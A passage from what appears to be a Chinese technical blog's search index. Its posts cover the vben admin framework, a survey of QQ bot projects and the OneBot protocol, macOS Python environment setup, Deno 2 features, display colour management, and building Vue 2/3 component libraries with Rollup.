Nitro 服务来进行接口 mock。</p><p>开发人员只需要按照 nitro 的规范在 <code>/api</code> 目录下创建对应的文件即可创建接口路由，详情查看 <a href="https://nitro.build/guide/routing">Nitro 相关的文档</a>。</p><h1 id="i18n"><a href="#i18n" class="headerlink" title="i18n"></a>i18n</h1><h1 id="Layout"><a href="#Layout" class="headerlink" title="Layout"></a>Layout</h1><h1 id="lint-工具管理"><a href="#lint-工具管理" class="headerlink" title="lint 工具管理"></a>lint 工具管理</h1><h1 id="偏好设置"><a href="#偏好设置" class="headerlink" title="偏好设置"></a>偏好设置</h1><p>偏好（preference）的设置散在 vben 项目多个位置，因为偏好设置与 app 耦合，但本身又属于 vben 核心实现的一环，其相关实现存在在以下几个目录：</p><ul><li><code>packages/preferences</code>：<ul><li>提供了 <code>defineOverridesPreferences</code> 函数，本身只是一个返回配置项的函数，通过 ts 配置为了方便生成配置信息而创建的函数，类似 Vue 的 <code>defineOptions</code>；</li><li>对 <code>@vben-core/preferences</code> 进行了重导出；</li></ul></li><li><code>packages/@core/preferences</code>：<ul><li>实现 PreferenceManager 类，并通过单例模式对外暴露一个 preferencesManager 实例供外部调用，所有的偏好相关设置都通过该实例进行管理；</li><li>在入口对外暴露清理偏好设置缓存、初始化偏好设置、更新偏好设置等工具函数；</li></ul></li><li><code>app/&lt;app-name&gt;/preferences.ts</code>：<ul><li>调用 <code>defineOverridesPreferences</code> 函数，配置当前应用的默认偏好设置，并返回一个配置列表；</li><li>在应用入口 <code>main.ts</code> 中调用 <code>initPreferences</code> 函数，将上一步返回的配置列表传入该初始化函数，以覆盖 <code>@vben-core/perferences</code> 默认提供的配置；</li></ul></li></ul><p>最终，在应用需要的位置通过调用 <code>import &#123; preferences &#125; from &#39;@vben/preferences&#39;</code> 来进行用户偏好配置的读写。</p><h1 id="图标"><a href="#图标" class="headerlink" title="图标"></a>图标</h1><h1 id="主题切换"><a href="#主题切换" class="headerlink" title="主题切换"></a>主题切换</h1><p>TODO: view-transition 动画分析</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 前端工程化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
            <tag> 前端工程化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>现有的 QQ Bot 实现方案调研</title>
      <link href="/2024/12/f48b353e31e6.html"/>
      <url>/2024/12/f48b353e31e6.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>QQ 目前已有官方机器人可以供普通用户申请使用，但是在 QQ 群中只能主动接收到 At 消息，可以参考官方的接入方案：<a href="https://bot.q.qq.com/wiki/">文档</a></p></blockquote><h1 id="1-被历史遗弃的-QQ-机器人项目"><a href="#1-被历史遗弃的-QQ-机器人项目" class="headerlink" title="1. 被历史遗弃的 QQ 机器人项目"></a>1. 被历史遗弃的 QQ 机器人项目</h1><h2 id="CQHTTP"><a href="#CQHTTP" class="headerlink" title="CQHTTP"></a>CQHTTP</h2><p><a href="https://github.com/kyubotics/coolq-http-api">项目地址</a></p><p>CQHTTP 插件是 2017 年初出现的基于 CKYU 机器人平台的一款开源免费插件，它使用户能够通过 HTTP 或 WebSocket 对 CKYU 的事件进行上报以及接收请求来调用 CKYU 的 DLL 接口，从而可以使用其它语言（不方便编译到原生二进制的语言）编写 CKYU 插件。</p><p>因此 CQHTTP 即是一款插件，又被当做了一种 HTTP 请求调用 QQ 机器人的标准。</p><h2 id="mirai"><a href="#mirai" class="headerlink" title="mirai"></a>mirai</h2><p><a href="https://github.com/mamoe/mirai">项目地址 14.5k</a></p><p>基于 Java 编写的 QQ 机器人平台，通过在 Linux 环境下模拟 QQ 登录实现，通过 http 插件可以实现发布订阅消息。同时 Mirai 也有一个庞大的社区，有着丰富的插件生态，因此即使用户不会编程，也可以轻松使用。</p><p>目前该实现方案受到严重的风控影响，使用第三方签名登录也不能很好的绕过风控，因此属于过时的方案。</p><h2 id="go-cqhttp"><a href="#go-cqhttp" class="headerlink" title="go-cqhttp"></a>go-cqhttp</h2><p><a href="https://github.com/Mrs4s/go-cqhttp">项目地址 10.4k</a></p><p>基于 Mirai 以及 MiraiGo 的 OneBot Golang 原生实现，其与 mirai 不同的是并没有被设计为一个支持各种插件的平台，而只是提供了 OneBot 相关协议的具体实现，用户可以使用自己喜欢的编程语言来通过 Http 或者 websocket 来调用该平台。</p><h2 id="oicq"><a href="#oicq" class="headerlink" title="oicq"></a>oicq</h2><p><a href="https://github.com/takayama-lily/oicq">项目地址 2.7k</a></p><h1 id="2-标准协议的创建"><a href="#2-标准协议的创建" class="headerlink" title="2.  标准协议的创建"></a>2.  标准协议的创建</h1><p>由于各种 QQ 机器人的平台总是面临着被风控、作者放弃维护的风险，导致如果针对平台来开发机器人插件（比如使用 Java 开发 Mirai 的插件），如果平台没了就得重新开发。因此为了避免这种情况的出现，OneBot 协议诞生了。</p><p>OneBot 协议规范了所有聊天机器人框架应该对外部提供的 API，并且协议并不只是针对 QQ 定制的，Telegram、钉钉等其他平台机器人的实现都可以遵循改标准，这样使用各种语言开发的机器人插件就不会由于机器人框架本身的迭代或者失效而作废。</p><p>协议地址：</p><ul><li><a href="https://github.com/botuniverse/onebot-11">OneBot 11</a></li><li><a href="https://12.onebot.dev/">OneBot 12（待定）</a></li></ul><p>此外，还有一个 Satori 协议：<a href="https://satori.js.org/zh-CN/introduction.html">Satori 介绍</a></p><h1 id="3-NTQQ-生态"><a href="#3-NTQQ-生态" class="headerlink" title="3. NTQQ 生态"></a>3. NTQQ 生态</h1><blockquote><p>由于QQ官方针对协议库的围追堵截，Mirai 类的方案已经无力继续维护。同时<code>NTQQ</code>的出现让我们可以使用官方 <strong>完美</strong> 实现的协议实现来继续开发Bot, 不再担心由于协议实现不完美而导致被识别。我们建议所有QQBot项目开始做好迁移至无头<code>NTQQ</code>或类似基于官方客户端技术的准备以应对未来的彻底封锁。</p><p>摘录自：<a href="https://github.com/Mrs4s/go-cqhttp/issues/2471">QQ Bot的未来以及迁移建议 #2471</a></p></blockquote><h2 id="LiteLoaderQQNT"><a href="#LiteLoaderQQNT" class="headerlink" title="LiteLoaderQQNT"></a>LiteLoaderQQNT</h2><p><a href="https://liteloaderqqnt.github.io/">项目地址 6.2k</a></p><p>LiteLoaderQQNT 与机器人没有多大关系，其是一款基于 NT 版 QQ 的插件加载器，它需要安装在 NTQQ 的客户端上，可以轻松实现防撤回、美化、定时消息等功能。</p><p>当然，你可以基于 LiteLoaderQQNT 提供的接口来实现 QQ 机器人。</p><h2 id="LLOneBot"><a href="#LLOneBot" class="headerlink" title="LLOneBot"></a>LLOneBot</h2><p><a href="https://github.com/LLOneBot/LLOneBot">项目地址 2.2k</a></p><p>LLOneBot 就是基于 LiteLoaderQQNT 实现兼容 OneBot11、Satori 协议的机器人插件。用户可以将其安装在 QQ 客户端中，其内部会开启一个服务器，来对外提供对 OneBot 协议的 API，由于其完全基于官方客户端运行，因此理论上没有被风控的风险。</p><h2 id="NapCatQQ"><a href="#NapCatQQ" class="headerlink" title="NapCatQQ"></a>NapCatQQ</h2><p><a href="https://github.com/NapNeko/NapCatQQ?tab=readme-ov-file">项目地址 2.8k</a></p><p>NapCatQQ 是一个实现了多种 Bot 协议的无头版本的 QQNT，不依赖框架加载，内存占用低，非常适合在服务端运行。</p><h2 id="Lagrange"><a href="#Lagrange" class="headerlink" title="Lagrange"></a>Lagrange</h2><p><a href="https://github.com/LagrangeDev/Lagrange.Core">项目地址</a></p><p>Lagrange 是一组项目，分别为：</p><p>Lagrange.Core 是一个开源的基于 C# 的 NTQQ 协议实现，你可以利用该项目来开发一个完全属于自己的 QQ 客户端。</p><p>Lagrange.OneBot 是一个基于 Core 并实现了 OneBot 协议 API 的服务程序。</p><p>LagrengeGo：Lagrenge 的 Go 语言实现。</p><p>lagrenge-python：Lagrenge 的 Python 语言实现。</p><h1 id="4-其他"><a href="#4-其他" class="headerlink" title="4. 其他"></a>4. 其他</h1><h2 id="OpenShamrock"><a href="#OpenShamrock" class="headerlink" title="OpenShamrock"></a>OpenShamrock</h2><h2 id="Koishi-js"><a href="#Koishi-js" class="headerlink" title="Koishi.js"></a>Koishi.js</h2>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> QQ </tag>
            
            <tag> Bot </tag>
            
            <tag> 聊天机器人 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MacOS Python 环境搭建</title>
      <link href="/2024/12/1b2d2ba857fe.html"/>
      <url>/2024/12/1b2d2ba857fe.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-环境管理"><a href="#1-环境管理" class="headerlink" title="1. 环境管理"></a>1. 环境管理</h1><h2 id="pyenv"><a href="#pyenv" class="headerlink" title="pyenv"></a>pyenv</h2><p>pyenv 是用来管理 python 版本的工具。</p><p>功能：</p><ul><li>允许您基于每个用户更改全局 Python 版本。</li><li>提供对每个项目的 Python 版本的支持。</li><li>允许您使用环境变量覆盖 Python 版本。</li><li><ul><li>一次搜索来自多个版本的 Python 的命令。这可能有助于使用 tox 测试跨 Python 版本。</li></ul></li></ul><p>安装：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install pyenv</span><br></pre></td></tr></table></figure><p>zsh 环境变量配置：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;export PYENV_ROOT=&quot;$HOME/.pyenv&quot;&#x27;</span> &gt;&gt; ~/.zshrc</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;[[ -d $PYENV_ROOT/bin ]] &amp;&amp; export PATH=&quot;$PYENV_ROOT/bin:$PATH&quot;&#x27;</span> &gt;&gt; ~/.zshrc</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;eval &quot;$(pyenv init -)&quot;&#x27;</span> &gt;&gt; ~/.zshrc</span><br></pre></td></tr></table></figure><p>列出可用的 python 版本并安装：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pyenv install -l</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装指定版本 Python</span></span><br><span class="line">pyenv install 3.10.4</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装最新版本 Python3</span></span><br><span class="line">pyenv install 3</span><br></pre></td></tr></table></figure><p>列出当前安装的 Python</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyenv versions</span><br></pre></td></tr></table></figure><p>切换 Python 版本：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 仅当前会话</span></span><br><span class="line">pyenv shell &lt;version&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 位于当前目录或其子目录时选择</span></span><br><span class="line">pyenv <span class="built_in">local</span> &lt;version&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 全局切换</span></span><br><span class="line">pyenv global &lt;version&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 全局切换为系统提供的 python 版本</span></span><br><span class="line">pyenv global system</span><br></pre></td></tr></table></figure><p>卸载 python：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyenv uninstall &lt;version&gt;</span><br></pre></td></tr></table></figure><h2 id="venv"><a href="#venv" class="headerlink" title="venv"></a>venv</h2><p>venv 是 Python 内置的用来创建虚拟环境的包，使用 venv 指令后可以创建一个与系统环境隔绝的 Python 环境，比如当使用 pip 时只会将安装的包安装到虚拟环境中。</p><blockquote><p>Python 3.5 之前使用 pyvenv 来创建虚拟环境</p></blockquote><p>创建虚拟环境：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在当前工作目录下创建 venv 环境，虚拟环境的内容将被保存在 venv 目录下</span></span><br><span class="line">python -m venv venv</span><br></pre></td></tr></table></figure><blockquote><p><code>-m</code> 指令保证 venv 模块从当前的 Python 环境中进行加载</p></blockquote><p>创建虚拟环境之后让虚拟环境生效：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> ./vevn/bin/activate</span><br></pre></td></tr></table></figure><p>退出虚拟环境：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deactivate</span><br></pre></td></tr></table></figure><h2 id="pip"><a href="#pip" class="headerlink" title="pip"></a>pip</h2><p><a href="https://packaging.python.org/en/latest/tutorials/installing-packages/#source-distributions-vs-wheels">参考</a></p><p>pip 是 Python 的包管理工具，其默认的源是 <a href="https://pypi.org/">PyPI</a></p><p>使用 pip 安装：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装最新版本</span></span><br><span class="line">python -m pip install <span class="string">&quot;SomeProject&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装特定版本</span></span><br><span class="line">python -m pip install <span class="string">&quot;SomeProject==1.4&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装大于或等于一个版本，且小于另一个版本</span></span><br><span class="line">python -m pip install <span class="string">&quot;SomeProject&gt;=1,&lt;2&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装与特定版本兼容的版本</span></span><br><span class="line">python -m pip install <span class="string">&quot;SomeProject~=1.4.2&quot;</span> <span class="comment"># 在这种情况下，这意味着安装任何版本“==1.4.*”也是“&gt;=1.4.2”的版本</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装多个包</span></span><br><span class="line">python -m pip install &lt;package1&gt; &lt;package2&gt; ...</span><br></pre></td></tr></table></figure><blockquote><p>如果要分发包，则需要使用 <code>setuptools</code> 和 <code>wheel</code></p></blockquote><p>安装 requirements 文件中的依赖项：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m pip install -r requirements.txt</span><br></pre></td></tr></table></figure><p>创建 requirements.txt：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m pip freeze &gt; requirements.txt</span><br></pre></td></tr></table></figure><h1 id="2-IDE-搭建"><a href="#2-IDE-搭建" class="headerlink" title="2. IDE 搭建"></a>2. IDE 搭建</h1><p>VSCode 安装以下插件：</p><ul><li>Python：基础扩展，包含了 Python Debugger、Pylance</li><li>Python Environment Manager：环境管理</li><li>Python Indent：代码缩进增强</li><li>autopep8：格式化工具</li><li>PyLint：Python Lint 工具</li></ul>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Deno 2 特性概览</title>
      <link href="/2024/12/35499eb34429.html"/>
      <url>/2024/12/35499eb34429.html</url>
      
        <content type="html"><![CDATA[<p>基于视频：<a href="https://www.youtube.com/watch?v=d35SlRgVxT8&t=626s">Announcing Deno 2</a></p><h1 id="Typescript-support"><a href="#Typescript-support" class="headerlink" title="Typescript support"></a>Typescript support</h1><p>Deno 无需配置即支持 Typescript。</p><p>许多 npm 包附带类型，您可以导入它们并直接将它们与类型一起使用：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> chalk <span class="keyword">from</span> <span class="string">&quot;npm:chalk@5&quot;</span>;</span><br></pre></td></tr></table></figure><p>有些软件包不附带类型，但您可以使用 @eno-types 指令指定它们的类型。例如，使用 @types 包：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// @deno-types=&quot;npm:@types/express@^4.17&quot;</span></span><br><span class="line"><span class="keyword">import</span> express <span class="keyword">from</span> <span class="string">&quot;npm:express@^4.17&quot;</span>;</span><br></pre></td></tr></table></figure><p>Node 附带了许多内置类型，例如 Buffer，它们可能会在 npm 包的类型中引用。要加载这些，您必须将类型引用指令添加到 @types/node 包：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;reference types=&quot;npm:@types/node&quot; /&gt;</span></span><br></pre></td></tr></table></figure><h1 id="Package-manager"><a href="#Package-manager" class="headerlink" title="Package manager"></a>Package manager</h1><p>deno 拥有 npm 一样的包管理指令：</p><ul><li>deno install</li><li>deno add</li><li>deno remove</li></ul><p>当项目存在 pacakge.josn 时，deno 会在项目中创建 node_modules 来进行依赖缓存。如果没有 package.json，deno 会读取 deno.json 并从全局缓存中进行查找或安装。</p><h2 id="可执行的-npm-脚本"><a href="#可执行的-npm-脚本" class="headerlink" title="可执行的 npm 脚本"></a>可执行的 npm 脚本</h2><p>类似 <code>npx</code>、<code>pnpm exec</code> 指令，deno 也可以直接运行 npm 脚本：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deno run &lt;permission flag&gt; npm:&lt;package name&gt;@&lt;version (optional)&gt; &lt;args&gt;</span><br></pre></td></tr></table></figure><h2 id="node-modules-的处理"><a href="#node-modules-的处理" class="headerlink" title="node_modules 的处理"></a>node_modules 的处理</h2><p>默认情况下，执行 deno run 的时候，deno 不会创建 node_modules，依赖将安装到全局缓存中，这是 deno 推荐的方式。</p><p>如果项目中需要 node_modules，可以在 <code>deno.json</code> 中配置：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;nodeModulesDir&quot;</span><span class="punctuation">:</span> <span class="string">&quot;auto&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>auto 模式会在项目目录下创建 node_modules，并尝试从全局缓存中拉取需要的包到 node_modules 中。</p><p>此外，<code>nodeModulesDir</code> 也可以被设置为 <code>manual</code>，这个模式下执行 <code>deno run</code> 时，deno 不会自动安装相关的依赖，用户必须手动调用 <code>deno install</code> 或者 <code>npm install</code> 来显示指定的进行包安装，安装后的包也会被放在项目的 <code>node_modules</code> 中。手动模式是项目使用 package.json 时的默认模式。</p><h2 id="缓存位置"><a href="#缓存位置" class="headerlink" title="缓存位置"></a>缓存位置</h2><p>使用 <code>deno info</code> 指令可以输出 deno 的缓存信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">DENO_DIR location: /Users/xxx/Library/Caches/deno</span><br><span class="line">Remote modules cache: /Users/xxx/Library/Caches/deno/remote</span><br><span class="line">npm modules cache: /Users/xxx/Library/Caches/deno/npm</span><br><span class="line">Emitted modules cache: /Users/xxx/Library/Caches/deno/gen</span><br><span class="line">Language server registries cache: /Users/xxx/Library/Caches/deno/registries</span><br><span class="line">Origin storage: /Users/xxx/Library/Caches/deno/location_data</span><br><span class="line">Web cache storage: /var/folders/0y/7qqcbbvn2k74zkvd46d0582w0000gn/T/deno_cache</span><br></pre></td></tr></table></figure><p>默认情况下，deno 使用 DENO_DIR  来缓存下载的依赖。</p><h1 id="JSR"><a href="#JSR" class="headerlink" title="JSR"></a>JSR</h1><p>JSR 是 NPM 的继任者，JSR 被设计为只支持 ESM，并不支持 CJS。</p><p>JSR 并不是想完全取代 NPM，可以理解为 JSR 是 NPM 的超集。</p><h1 id="Deno-standard-library"><a href="#Deno-standard-library" class="headerlink" title="Deno standard library"></a>Deno standard library</h1><p>Deno 创建了各种标准库来期望统一 Deno 的开发体验，标准库被分发在 JSR 上，大多以 <code>@std</code> 为包的命名空间，理论上支持 Node 或者其他的 JS 运行时来调用。</p><p>比如：</p><ul><li>@std/testing 取代 jest</li><li>@std/expect 取代 chai</li><li>@std/cli 取代 minimist</li><li>@std/collection 取代 lodash</li></ul><p>Before:</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202412102142385.png" alt="image.png"></p><p>After：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202412102143455.png" alt="image.png"></p><h1 id="JSR-demo"><a href="#JSR-demo" class="headerlink" title="JSR demo"></a>JSR demo</h1><p>使用标准的 fs 模块可以提供快捷的目录遍历功能：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202412102146018.png" alt="image.png|400"></p><p>你可以与 NodeJS 的 fs 模块结合使用：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202412102147183.png" alt="image.png|400"></p><p>如果想要发布包到 jsr，只需要在 jsr 上创建项目并复制需要的 deno.json 文件到本地，并运行 <code>deno publish</code> 即可。</p><p>需要注意，如果发布 jsr 包，则需要在代码中指定依赖包的版本：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202412102152265.png" alt="image.png|400"></p><p>JSR 支持根据代码中书写的 JSDoc 来自动生成在线文档：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202412102153143.png" alt="image.png|400"></p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202412102154590.png" alt="image.png|400"></p><h1 id="Workspace-and-monorepo"><a href="#Workspace-and-monorepo" class="headerlink" title="Workspace and monorepo"></a>Workspace and monorepo</h1><p>deno 的 workspace 与 npm 的相似。</p><p>deno 还支持 package.json 和 deno.json 的共存：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202412102157314.png" alt="image.png|400"></p><h1 id="Long-term-support"><a href="#Long-term-support" class="headerlink" title="Long term support"></a>Long term support</h1><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202412102158584.png" alt="image.png|400"></p><h1 id="Deno-is-fast"><a href="#Deno-is-fast" class="headerlink" title="Deno is fast"></a>Deno is fast</h1><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202412102200369.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
          <category> Node </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 快速入门 </tag>
            
            <tag> NodeJS </tag>
            
            <tag> Deno </tag>
            
            <tag> 服务器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习屏幕色域、色彩管理相关的知识笔记</title>
      <link href="/2024/11/61e5437d38fa.html"/>
      <url>/2024/11/61e5437d38fa.html</url>
      
        <content type="html"><![CDATA[<h1 id="什么是色域、色彩空间"><a href="#什么是色域、色彩空间" class="headerlink" title="什么是色域、色彩空间"></a>什么是色域、色彩空间</h1><p>下图是人眼可见的颜色通过数学关系映射到平面中，也叫马蹄图。</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20241110003227.png" alt=""></p><p>对于显示器来说，不可能百分百显示出人眼可见的颜色，只能显示一部分。并且显示器能力不一样，显示出的范围也不一致，为了规范显示器显示颜色的范围，就有了 sRGB、Adobe RGB、display P3 等各种各样的规范来描述一张图片显示的色彩范围。对于普通人来说，sRGB 是比较常见的，DCI-P3 则是一种比较常见的广色域色彩空间。</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20241110003816.png" alt=""></p><p>容易比较混淆的一点是，sRGB、DCI-P3 并不能笼统的称为色彩空间（Color Space），如果你保存一张 P3 广色域图片，你可以看到在苹果的文件信息查看器中显示的色彩空间是 RGB。</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20241110010707.png" alt="QQ_1731172016942.png|400"></p><p>这是应为常见的色彩空间有两种 RGB、CMYK，前者在数码显示设备上使用，后者则是在打印领域使用。正确的说法是 sRGB、DCI-P3 属于一种 RGB 色彩空间。</p><h1 id="色彩管理"><a href="#色彩管理" class="headerlink" title="色彩管理"></a>色彩管理</h1><p>当我们只做一张图片时，是基于某个色彩空间制作的，比如我想只做一张广色域图片，那么就可以使用 Display P3 色彩空间来制作，制作完成后为了让其他显示器知道这张图片是使用哪个色彩空间，就会给这个图片再内嵌一个 ICC 文件来进行标识，也就是颜色描述文件，我们可以通过查看文件信息来找到：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20241110005521.png" alt=""></p><p>系统读取到这个标记后，就会尝试正确的还原这个颜色。但是屏幕只能显示一种色域，如果 P3 色域的屏幕显示了  sRGB 图片，就需要做相对应的转换。</p><p>举例来说：DIsplay P3 色域包含了 sRGB 所有可见的颜色，但是 P3 显示的颜色范围更广，对于 sRGB 图片的纯红色 rgb(255,0,0) 如果不加任何处理显示在 P3 屏幕上，红色将变得更加艳丽。因此为了正确还原 sRGB 的红色，一种比较理想的方式是将 P3 色域作为一个容器，在这个容器中，将 sRGB 中的 rgb(255,0,0) 映射为 rgb(234,51,35) 进行显示，那么这个图片在 P3 显示器中就能正确的显示 sRGB 图片而不是过饱和。这个色彩转换的流程就叫做色彩管理。</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20241110011451.png" alt="QQ_1731172488996.png|400"></p><h3 id="小米的色彩管理"><a href="#小米的色彩管理" class="headerlink" title="小米的色彩管理"></a>小米的色彩管理</h3><p>小米默认的色彩管理模式是以尽量让用户看到的内容更鲜艳为目标来的，因此它会将 sRGB 内容的颜色拉伸到 P3 色域，让内容显示得更加鲜艳，但是遇到 P3 广色域的图就无法正确还原了，因为它的流程是如下的：</p><ul><li>以 sRGB 作为颜色容器</li><li>超过 sRGB 范围的颜色进行 clip，颜色映射到 sRGB 色域的最边缘</li><li>然后将映射完的颜色显示在屏幕上，低端机 sRGB 就正常显示，如果是 P3 广色域的屏幕，会将 sRGB 颜色进行暴力拉伸，颜色看起来就更加鲜艳</li></ul><p>小米的原色模式则是跟前面提到的标准的广色域映射流程是一样的，也就是以 P3 色域为容器，sRGB 内容也不会强行拉颜色。</p>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 硬件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用 Rollup 构建 Vue2 &amp; 3 的通用组件库</title>
      <link href="/2024/09/48c98dfa1bc0.html"/>
      <url>/2024/09/48c98dfa1bc0.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-背景"><a href="#1-背景" class="headerlink" title="1. 背景"></a>1. 背景</h1><p>Vue3 在 Vue2 的基础之上做了很大的变更，因此<strong>编译后的 Vue2 组件</strong>并不能适用到 Vue3 项目中，这对团队将来升级 Vue 框架会是一种极大的限制，同时新项目也可能因为无法复用旧项目的资产而导致放弃使用全新的框架。</p><p>好在 Vue3 的 Composition API 移植到了 Vue2.7，并且低版本的 Vue 也可以通过安装 <a href="https://github.com/vuejs/composition-api/tree/2436ba2ca0ae804a3932924407f54e675073ea5c">@vue/composition-api</a> 来得到支持。因此我们可以以此为桥梁，通过标准化的 Composition API 来编写 Vue2 与 Vue3 的通用组件。这一点很容易验证，在大多数情况下，我们编写的 setup 组件源码可以不经过修改就能同时在 Vue2、Vue3 项目中直接使用（但差异性仍然是存在的，具体可见 <a href="https://v2.cn.vuejs.org/v2/guide/migration-vue-2-7.html#%E4%B8%8E-Vue-3-%E7%9A%84%E8%A1%8C%E4%B8%BA%E5%B7%AE%E5%BC%82">Vue2.7 与 Vue3 的行为差异</a>）。</p><p>有了思路之后，我们再来谈论下具体实现，通常编写 Vue 组件库有两种方案：</p><ol><li>将 SFC 组件源码（也就是 <code>.vue</code> 文件）发布到 NPM，使用方需要对其进行构建；</li><li>将 SFC 组件源码编译为 JS 在进行发布到 NPM，业务方直接引入即可，无需对其进行编译；</li></ol><p>这两种方式各有优劣：</p><ul><li>直接发布源码的优势是成本低，可快速发布，但缺点是对使用方要求高，使用方需要完成 SFC 组件源码转为 JS 的这一过程，如果组件的提供方与使用方存在技术差异（如编写组件时使用了 TS，而组件的适用方项目中并不支持 TS），处理起来会比较麻烦。因此大多数开源组件库并不以这种方式来发布组件。</li><li>经过编译后发布源码的缺点是搭建组件库的成本较高，但除此之外就没有什么缺点了，组件的构建方可以使用 Babel、TS 等不会对使用方产生影响的技术栈，也可以将组件编译为更多的包规范提供给更多的项目使用，并且发不到 NPM 上的组件已经是被预编译过的源码，也降低了适用方编译的压力。</li></ul><p>当然，两种实现方案具体用哪一个还是源于业务需求，他们也都有方法可以构建为 Vue2 与 Vue3 